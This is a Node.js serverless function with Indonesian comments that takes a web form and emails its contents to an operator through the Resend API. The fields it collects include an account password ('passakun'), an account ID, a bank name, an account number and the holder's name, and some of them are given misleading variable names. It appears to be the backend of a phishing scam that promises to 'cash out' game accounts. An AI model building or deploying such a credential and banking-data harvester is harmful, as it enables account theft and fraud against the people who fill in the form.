// Hapus nodemailer, ganti dengan resend
const { Resend } = require('resend');
require('dotenv').config({ path: './.env.local' });

// Inisialisasi Resend dengan API Key dari Environment Variables
const resend = new Resend(process.env.RESEND_API_KEY);

// Fungsi utama yang akan dijalankan Vercel
module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        res.status(405).send('Method Not Allowed');
        return;
    }

    const data = req.body;
    
    // Ambil dan bersihkan data (sama seperti sebelumnya)
    const id_anda            = data.passakun || 'N/A';
    const nickname           = data.nickname || 'N/A';
    const jumlah_bongkaran   = data.Idakun || 'N/A';
    const bank_pencairan     = data.narek || 'N/A';
    const nomor_rekening     = data.norek || 'N/A';
    const atas_nama          = data.atasnama || 'N/A';

    // Susun isi email (dalam format HTML atau Text)
    const subject = `[BONGKAR ID] TRANSAKSI BARU dari ${nickname} (${id_anda})`;
    const bodyText = `
        Halo Admin,

        ... [Isi email di sini, sama seperti kode sebelumnya] ...

        Target ID Kirim       : 21640006
        ...
    `;

    try {
        // Kirim email menggunakan Resend API
        const emailResult = await resend.emails.send({
            from: process.env.EMAIL_PENGIRIM, // Harus email yang sudah diverifikasi di Resend
            to: [process.env.EMAIL_TUJUAN],
            subject: subject,
            text: bodyText,
        });
        
        // Cek jika Resend mengembalikan status sukses
        if (emailResult.data && emailResult.data.id) {
            res.status(200).setHeader('Location', '/sukses.html').send({ message: 'Email berhasil dikirim dan Redirecting...', id: emailResult.data.id });
        } else {
             // Jika API gagal tapi tidak melempar error (jarang terjadi)
             res.status(500).send({ error: 'Gagal mengirim data melalui API Resend.' });
        }
    
    } catch (error) {
        console.error('Gagal mengirim email:', error);
        // Error yang dilempar dari Resend
        res.status(500).send({ error: 'Gagal mengirim data melalui API.', details: error.message });
    }
};
